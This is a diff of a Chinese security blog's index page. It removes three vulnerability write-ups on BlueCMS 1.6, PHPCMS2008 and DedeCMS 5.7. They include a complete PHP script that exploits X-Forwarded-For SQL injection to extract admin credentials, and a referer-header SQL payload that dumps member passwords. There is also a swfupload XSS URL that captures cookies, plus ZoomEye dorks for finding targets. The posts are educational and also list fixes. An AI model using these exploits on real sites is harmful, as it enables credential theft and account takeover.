+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-PHPCMS-2008-命令执行漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -833,416 +1307,9 @@
 
 
   
-    <article id="post-BlueCMS-1-6-SQL-注入漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/11/27/BlueCMS-1-6-SQL-注入漏洞/">BlueCMS 1.6 SQL 注入漏洞</a>
-    </h1>
-  
-
-        
-        <a href="/2018/11/27/BlueCMS-1-6-SQL-注入漏洞/" class="archive-article-date">
-  	<time datetime="2018-11-27T05:46:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-27</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>BlueCMS是一款国产的CMS平台，十分灵活、方便，早些年广泛的应用于商业系统、个人博客等。</p>
-<p>程序在使用getip()函数获取客户端ip时没有严格过滤数据，导致sql注入漏洞，攻击者通过SQL注入漏洞可直接获取到管理员的账号密码，危害严重</p>
-<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>BlueCMS V1.6 SP1</p>
-<h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>攻击者通过SQL注入漏洞，可直接获取到管理员的账号密码，或者数据库中其他信息，进一步能获取到Webshell，甚至危害服务器的安全。</p>
-<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞出现在<code>/comment.php</code> ，关键代码如下：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">elseif($act == 'send')</span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">sql = "<span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">".table('comment')."</span> (com_id, post_id, user_id, <span class="keyword">type</span>, mood, <span class="keyword">content</span>, pub_date, ip, is_check)<span class="keyword">VALUES</span> (<span class="string">''</span>, <span class="string">'id'</span>, <span class="string">'user_id'</span>, <span class="string">'type'</span>, <span class="string">'mood'</span>, <span class="string">'content'</span>, <span class="string">'timestamp'</span>, <span class="string">'".getip()."'</span>, <span class="string">'is_check'</span>)<span class="string">"; </span></span><br><span class="line"><span class="string">db-&gt;query(sql);</span></span><br></pre></td></tr></table></figure>
-<p>在上述代码中，构造了一个查询语句，赋值给$sql变量，接下来直接执行了此语句，没有进行任何过滤。我们可以看到在sql语句中，有一个值为<code>getip</code> ，这个变量是用户可控的。</p>
-<p>接下来通过搜索找到getip的位置，位于<code>/include/common.fun.php</code>，代码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="keyword">if</span> (getenv(<span class="string">'HTTP_CLIENT_IP'</span>))&#123;</span><br><span class="line">    $ip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>);        <span class="comment">//可伪造</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>))&#123;</span><br><span class="line">    $ip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);  <span class="comment">//可伪造</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED'</span>))&#123;</span><br><span class="line">    $ip = getenv(<span class="string">'HTTP_X_FORWARDED'</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>))&#123;</span><br><span class="line">    $ip = getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED'</span>))&#123;</span><br><span class="line">    $ip = getenv(<span class="string">'HTTP_FORWARDED'</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line">    ip = _SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>上述代码首先从环境变量中取得用户的ip，如果正常取得ip，则正常返回，如果不存在，则获取客户端用代理服务器访问时的ip，如果还是没有，就继续取<code>X_FORWARDED_FOR</code>的值。</p>
-<p>可以看出来，这里的代码没有经过任何处理，直接取值，然后将取得的值带入到<code>Getip</code>中，因此我们可以通过伪造<code>X_FORWARDED_FOR</code>，构造恶意语句，通过注入，获取数据库敏感信息。</p>
-<p>直接利用Payload获取目标网页目录账号密码。</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>payload构造：<code>00’,’1’),(“,’1’,’0’,’1’,’6’,(select  concat(‘&lt;u-‘,admin_name,’-u&gt;&lt;p-‘,pwd,’-p&gt;’)from  blue_admin),’1281181973’,’99</code>闭合前一个语句，插入下一个语句，能够回显查询语句；</p>
-<p>利用http请求头修改插件：firefox浏览器的插件tamper  data、http live  headers或者burpsuit</p>
-<p>开启tamper data，点击提交正常评论，捕获请求tamper，其余请求submit。</p>
-<p>http请求头处插入一个字段+payload;</p>
-<p>右键查看源代码，管理员账号与密码在页面中。</p>
-<p>或者：</p>
-<p>使用如下命令进入目录：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd c:\Program Files\phpstudy\php52</span><br></pre></td></tr></table></figure>
-<p>接下来运行payload，使用命令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php.exe 1.php xx.xx.xx.xx /Blue/</span><br></pre></td></tr></table></figure>
-<p>上面的命令，意思是：使用php.exe去执行1.php，并设置了ip为xx.xx.xx.xx，目录为Blue。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.php sql injection exploit</span></span><br><span class="line">print_r(<span class="string">'</span></span><br><span class="line"><span class="string">+---------------------------------+</span></span><br><span class="line"><span class="string">BlueCMS v1.6 sp1 Getip() Remote SQL Injection Exploit</span></span><br><span class="line"><span class="string">+---------------------------------+</span></span><br><span class="line"><span class="string">'</span>);    </span><br><span class="line"><span class="keyword">if</span> ($argc &lt; <span class="number">3</span>)&#123;</span><br><span class="line">    print_r(<span class="string">'</span></span><br><span class="line"><span class="string">+----------------------------------------+</span></span><br><span class="line"><span class="string">Example:</span></span><br><span class="line"><span class="string">php '</span>.$argv[<span class="number">0</span>].<span class="string">' localhost /bluecms/</span></span><br><span class="line"><span class="string">+----------------------------------------+</span></span><br><span class="line"><span class="string">'</span>);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">error_reporting(<span class="number">7</span>);</span><br><span class="line">ini_set(<span class="string">'max_execution_time'</span>,<span class="number">0</span>);</span><br><span class="line">$host = $argv[<span class="number">1</span>];</span><br><span class="line">$path = $argv[<span class="number">2</span>];</span><br><span class="line">send();</span><br><span class="line">send2();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $host, $path;</span><br><span class="line">    $cmd = <span class="string">"mood=6&amp;comment=test&amp;id=1&amp;type=1&amp;submit=%CC%E1%BD%BB%C6%C0%C2%DB"</span>;</span><br><span class="line">    $getinj=<span class="string">" 00','1'),('','1','0','1','6',(select concat('&lt;u-',admin_name,'-u&gt;&lt;p-',pwd,'-p&gt;') from blue_admin),'1281181973','99"</span>;</span><br><span class="line">    $data = <span class="string">"POST "</span>.$path.<span class="string">"comment.php?act=send HTTP/1.1\r\n"</span>;</span><br><span class="line">    $data .= <span class="string">"Accept: */*\r\n"</span>;</span><br><span class="line">    $data .= <span class="string">"Accept-Language: zh-cn\r\n"</span>;</span><br><span class="line">    $data .= <span class="string">"Content-Type: application/x-www-form-urlencoded\r\n"</span>;</span><br><span class="line">    $data .= <span class="string">"User-Agent: Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)\r\n"</span>;</span><br><span class="line">    $data .= <span class="string">"Host: $host\r\n"</span>;</span><br><span class="line">    $data .= <span class="string">"Content-Length: "</span>.strlen($cmd).<span class="string">"\r\n"</span>;</span><br><span class="line">    $data .= <span class="string">"Connection: Close\r\n"</span>;</span><br><span class="line">    $data .= <span class="string">"X-Forwarded-For: $getinj\r\n\r\n"</span>;</span><br><span class="line">    $data .= $cmd;</span><br><span class="line">	</span><br><span class="line">    $fp = fsockopen($host,<span class="number">80</span>);</span><br><span class="line">    fputs($fp,$data);</span><br><span class="line">    </span><br><span class="line">    $resp = <span class="string">''</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">while</span> ($fp &amp;&amp; !feof($fp))</span><br><span class="line">        $resp .= fread($fp,<span class="number">1024</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $resp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $host, $path;</span><br><span class="line">    $message = <span class="string">"GET "</span>.$path.<span class="string">"news.php?id=1 HTTP/1.1\r\n"</span>;</span><br><span class="line">    $message .= <span class="string">"Accept: image/gif,image/jpeg.image/pjpeg,image/pjpeg,application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/xaml+xml, application/vnd.ms-xpsdocument, application/x-ms-xbap, application/x-ms-application, */*\r\n"</span>;</span><br><span class="line">    $message .= <span class="string">"Accept-Language: zh-cn\r\n"</span>;</span><br><span class="line">    $message .= <span class="string">"Accept-Encoding: gzip, deflate\r\n"</span>;</span><br><span class="line">    $message .= <span class="string">"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0;.NET CLR 2.0.50727;GreenBrowser)\r\n"</span>;</span><br><span class="line">    $message .= <span class="string">"Host: $host\r\n"</span>;</span><br><span class="line">    $message .= <span class="string">"Connection:Keep-Alive\r\n\r\n"</span>;</span><br><span class="line">    $fd = fsockopen($host,<span class="string">'80'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!$fd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'[-]No response from'</span>.$host;</span><br><span class="line">        <span class="keyword">die</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fputs($fd,$message);</span><br><span class="line">    $resp = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">while</span> (!feof($fd))&#123;</span><br><span class="line">        $resp.=fgets($fd);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($fd);</span><br><span class="line">    preg_match_all(<span class="string">"/&lt;u-([^&lt;]*)-u&gt;&lt;p-([^&lt;]*)-p&gt;/"</span>,$resp,$db);</span><br><span class="line">    <span class="keyword">if</span>($db[<span class="number">1</span>][<span class="number">0</span>]&amp;$db[<span class="number">2</span>][<span class="number">0</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"username-&gt;"</span>.$db[<span class="number">1</span>][<span class="number">0</span>].<span class="string">"\r\n"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"password-&gt;"</span>.$db[<span class="number">2</span>][<span class="number">0</span>].<span class="string">"\r\n"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[+]congratulation ^^"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'[-]exploited fail &gt;"&lt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h3><ol>
-<li>过滤转义相关参数；</li>
-<li>使用传参数的方式进行查询；  </li>
-<li>使用在线防护产品；</li>
-</ol>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/11/27/BlueCMS-1-6-SQL-注入漏洞/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-PHPCMS2008-SQL注入漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/11/26/PHPCMS2008-SQL注入漏洞/">PHPCMS2008 SQL注入漏洞</a>
-    </h1>
-  
-
-        
-        <a href="/2018/11/26/PHPCMS2008-SQL注入漏洞/" class="archive-article-date">
-  	<time datetime="2018-11-26T06:35:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-26</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="ZoomEye-Dork"><a href="#ZoomEye-Dork" class="headerlink" title="ZoomEye Dork"></a>ZoomEye Dork</h3><p><code>app:phpcms</code></p>
-<h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>PHPCMS2008由于广告模块取referer不严，导致一处sql注入漏洞.可以得到管理员用户名与密码，攻击者登录后台后可能会获取webshell，对服务器进行进一步的渗透。</p>
-<h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>攻击者通过SQL注入漏洞，获取获取后台管理员账号密码，进一步可能得到Webshell，并对服务器安全造成极大的威胁。</p>
-<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>漏洞产生的位置位于<code>/ads/include/ads_place.class.php</code>的show方法中，漏洞代码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">($placeid)</span></span></span><br><span class="line"><span class="function">...</span></span><br><span class="line"><span class="function"><span class="title">if</span><span class="params">($adses0)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">foreach</span>(adses <span class="keyword">as</span> ads)</span><br><span class="line">&#123;</span><br><span class="line">contents[] = ads_content(ads, <span class="number">1</span>);</span><br><span class="line">this-&gt;db-&gt;query(“INSERT INTOthis-&gt;stat_table(adsid,username,ip,referer,clicktime,type)VALUES (‘ads[adsid]<span class="string">','</span>_username<span class="string">','</span>ip<span class="string">',‘this-&gt;referrer'</span>,‘$time<span class="string">',,'</span><span class="number">0</span><span class="string">')”);</span></span><br><span class="line"><span class="string">template = ads['</span>template<span class="string">'] ? $ads['</span>template<span class="string">'] : '</span>ads<span class="string">';</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure>
-<p>可以看到，这里的$this-&gt;referrer通过this方法直接将HTTP请求头中的referer字段插入到数据库中，没有做任何过滤措施。</p>
-<p>找到了漏洞的出处，接下来寻找包含漏洞的用户可控的页面。如果漏洞是用户不可控的，比如只能管理员利用，那就相对比较鸡肋了。</p>
-<p>通过回溯法找到，在页面<code>/ads/include/commom.inc.php</code>中调用了<code>ads_place.class.php</code> 。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">...</span><br><span class="line"><span class="keyword">require</span> MOD_ROOT.<span class="string">'include/ads_place.class.php'</span>;</span><br><span class="line"><span class="keyword">require</span> MOD_ROOT.<span class="string">'include/ads.class.php'</span>;</span><br><span class="line">...</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>继续回溯，发现在<code>/ads/ad.php</code> 中调用了<code>/ads/include/commom.inc.php</code>，ad.php文件为用户可控文件，但ad.php大多数情况下不能访问，因此继续向上查找。</p>
-<p>发现了<code>/data/js.php</code> ，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">chdir(&apos;../ads/&apos;);</span><br><span class="line">require &apos;./ad.php&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>在用户访问首页时，会调用js.php，通过该文件可以提交有害字段，然后通过逐层调用，因此我们可以传入字段referer到危险方法show中，引入SQL注入攻击</p>
-<p><img src="/2018/11/26/PHPCMS2008-SQL注入漏洞/phpcms1.png" alt="phpcms1"></p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>Tamper Data：它是火狐浏览器的一款插件，主要功能如下：</p>
-<p>可以用来查看和修改 HTTP/HTTPS 的头部和 POST 参数；<br>可以用来跟踪 HTTP 请求和响应<br>可以对 WEB 站点进行某些安全测试，用来调试 WEB 配置十分方便</p>
-<p>网址：<code>xxx/data/js.php?id=1</code></p>
-<p><u>点击Tamper之前，将下面选项中的对勾要取消掉，这样它就不会抓取下面的包了，否则它会不停的弹出抓包提醒。</u></p>
-<p>并没有找到referer 包，因此可以添加一个，并在内容里写入如下Payload：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">referer=1', (<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> (<span class="keyword">select</span> <span class="keyword">count</span>(), <span class="keyword">concat</span>(<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)<span class="number">2</span>),<span class="built_in">char</span>(<span class="number">45</span>,<span class="number">45</span>,<span class="number">45</span>),(<span class="keyword">SELECT</span> <span class="keyword">password</span> <span class="keyword">from</span> phpcms_member <span class="keyword">limit</span> <span class="number">1</span>))a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a)b), ‘<span class="number">0</span><span class="string">')#</span></span><br></pre></td></tr></table></figure>
-<h3 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h3><ul>
-<li>对相关字段进行过滤处理</li>
-<li>使用传参数方式进行数据库查询操作</li>
-<li>使用在线防护软件，如安全狗等</li>
-</ul>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/11/26/PHPCMS2008-SQL注入漏洞/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-DedeCMS-5-7-反射型XSS漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/11/26/DedeCMS-5-7-反射型XSS漏洞/">DedeCMS 5.7 反射型XSS漏洞</a>
-    </h1>
-  
-
-        
-        <a href="/2018/11/26/DedeCMS-5-7-反射型XSS漏洞/" class="archive-article-date">
-  	<time datetime="2018-11-26T05:33:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-26</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="DedeCMS-5-7-反射型XSS漏洞"><a href="#DedeCMS-5-7-反射型XSS漏洞" class="headerlink" title="DedeCMS 5.7 反射型XSS漏洞"></a>DedeCMS 5.7 反射型XSS漏洞</h2><h3 id="1-ZoomEye-DorK"><a href="#1-ZoomEye-DorK" class="headerlink" title="1.ZoomEye DorK:"></a>1.ZoomEye DorK:</h3><p><code>app:dedecms</code></p>
-<h3 id="2-Externallnterface-call"><a href="#2-Externallnterface-call" class="headerlink" title="2.Externallnterface.call"></a>2.Externallnterface.call</h3><p>此函数作为FLASH与宿主页面JavaScript通信的接口，一般来说，由“2”个参数，第一个参数为所调用JS函数名。后续的参数则为所调用的JS函数的参数。<br>那么在参数可控的情况下，不论是第一个参数还是后续参数，均能加以利用实现XSS<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> func:<span class="built_in">String</span>=root.loaderInfo.parameters.func;</span><br><span class="line"><span class="comment">//接受Flash所带的func参数</span></span><br><span class="line">ExternalInterface.call(func，<span class="string">"1"</span>);</span><br></pre></td></tr></table></figure></p>
-<p><code>http://xxx.com/xxx.swf?a=1&amp;b=2&amp;func=alert</code><br>在ActionScript（AS)里面root.loaderInfo.parameters结构如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">"a"</span>:<span class="number">1</span>,</span><br><span class="line"><span class="string">"b"</span>:<span class="number">2</span>,</span><br><span class="line"><span class="string">"func"</span>:<span class="string">"alert"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p><code>http://xxx.com/xxx.swf?func=(function(){alert(&quot;hack&quot;)})</code><br>as代码：ExternalInterface.call(“函数名”,”参数1”);<br>相当于js的：函数名(“参数1”);<br>最终浏览器执行：<br><code>try{_flash_toXML(函数名(&quot;参数1&quot;));}catch(e){&quot;&lt;undefined/&gt;&quot;;}</code></p>
-<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p><code>&quot;])}catch(e){alert(1)};//</code></p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    _flash_toXML(SWFUpload.instances[<span class="string">""</span>])</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    alert(<span class="number">1</span>)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//"].flashReady("参数1"));&#125;catch(e)&#123;"&lt;undefined/&gt;";&#125;</span></span><br></pre></td></tr></table></figure>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><code>http://目标地址/images/swfupload/swfupload.swf?movieName=&quot;])}catch(e){if(!window.x){window.x=1;alert(document.cookie)}}//</code></p>
-<p><code>alert(document.cookie)</code>可自定义，比如放在盲打平台</p>
-<h3 id="反射型XSS怎么用"><a href="#反射型XSS怎么用" class="headerlink" title="反射型XSS怎么用"></a>反射型XSS怎么用</h3><p>1.欺骗<br>2.结合CSRF</p>
-<h3 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h3><p>1.对传入call的字符串进行判断或过滤操作<br>2.使用在线防护产品</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/11/26/DedeCMS-5-7-反射型XSS漏洞/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-原则" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/11/26/原则/">原则</a>
-    </h1>
-  
-
-        
-        <a href="/2018/11/26/原则/" class="archive-article-date">
-  	<time datetime="2018-11-26T03:51:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-26</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
